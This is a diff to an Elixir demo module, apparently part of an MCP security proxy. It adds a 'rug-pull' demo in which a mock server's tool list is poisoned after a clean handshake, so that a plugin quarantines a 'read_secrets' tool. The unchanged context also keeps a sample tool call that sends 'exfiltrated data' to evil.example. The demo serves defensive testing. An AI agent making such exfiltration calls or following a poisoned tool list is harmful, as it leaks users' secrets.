@@ -4,7 +4,7 @@ defmodule PhoenixElxirBeam.MCP.Demo do
   calls (via `Req`) to the proxy, exactly as a real MCP client would.
   """
 
-  alias PhoenixElxirBeam.MCP.PolicyEngine
+  alias PhoenixElxirBeam.MCP.{MockDrift, PolicyEngine, ServerRegistry}
 
   @step_delay_ms 600
 
@@ -36,6 +36,38 @@ defmodule PhoenixElxirBeam.MCP.Demo do
          "arguments" => %{"url" => "https://evil.example/collect", "body" => "exfiltrated data"}
        })}
     ])
+  end
+
+  @doc """
+  Rug-pull demo: register the `files` mock as an external server (a clean
+  handshake), then poison its `tools/list` and re-handshake. The re-handshake
+  trips `PhoenixElxirBeam.MCP.Plugins.RugPull`, quarantining `read_secrets`.
+  """
+  def run_rug_pull_demo do
+    Task.Supervisor.start_child(PhoenixElxirBeam.MCP.TaskSupervisor, fn ->
+      base_url = mock_base_url("files")
+      MockDrift.heal("files")
+
+      ServerRegistry.list_servers()
+      |> Enum.filter(&(Map.get(&1, :base_url) == base_url))
+      |> Enum.each(&ServerRegistry.remove_server(&1.id))
+
+      case ServerRegistry.register_server("files (rug-pull demo)", base_url) do
+        {:ok, server} ->
+          Process.sleep(@step_delay_ms)
+          MockDrift.poison("files")
+          Process.sleep(@step_delay_ms)
+          ServerRegistry.rehandshake(server.id)
+
+        {:error, _reason} ->
+          :ok
+      end
+    end)
+  end
+
+  defp mock_base_url(server_id) do
+    port = PhoenixElxirBeamWeb.Endpoint.config(:http)[:port]
+    "http://127.0.0.1:#{port}/mcp/servers/#{server_id}"
   end
 
   defp start_task(scenario, steps) do
